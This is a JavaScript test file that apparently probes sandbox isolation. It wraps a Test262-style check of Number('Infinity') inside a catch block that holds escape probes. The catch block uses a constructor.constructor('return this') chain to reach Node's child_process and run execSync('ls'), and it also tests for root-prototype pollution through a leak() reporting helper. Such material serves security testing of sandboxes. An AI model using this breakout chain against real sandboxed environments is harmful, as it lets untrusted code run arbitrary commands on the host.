try {
    function dynaString(s1, s2) {
        throw () => {
            return () => {
            };
        };
        return String(s1) + String(s2);
    }
    if (Number(dynaString('Infi', 'nity')) !== Number.POSITIVE_INFINITY) {
        $ERROR('#1: Number("Infi"+"nity") === Number.POSITIVE_INFINITY');
    }
    if (Number(dynaString('Infi', 'nity')) !== 1e+400) {
        $ERROR('#2: Number("Infi"+"nity") === 10e10000');
    }
    if (Number(dynaString('Infi', 'nity')) !== 1e+400) {
        $ERROR('#3: Number("Infi"+"nity") === 10E10000');
    }
    if (Number(dynaString('Infi', 'nity')) !== Number('10e10000')) {
        $ERROR('#4: Number("Infi"+"nity") === Number("10e10000")');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}